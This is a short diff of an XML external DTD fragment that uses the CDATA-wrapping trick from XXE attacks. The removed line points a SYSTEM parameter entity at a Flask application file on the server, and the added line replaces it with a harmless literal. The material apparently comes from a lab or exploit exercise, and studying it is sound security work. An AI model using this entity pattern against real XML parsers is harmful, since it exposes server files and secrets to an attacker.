@@ -1,5 +1,5 @@
 <!ENTITY % start "<![CDATA[">
-<!ENTITY % mid SYSTEM "file:/usr/local/lib/python2.7/dist-packages/flask/app.py">
+<!ENTITY % mid "<amit></amit>">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY fileContents '%start;%mid;%end;'>">
 %all;
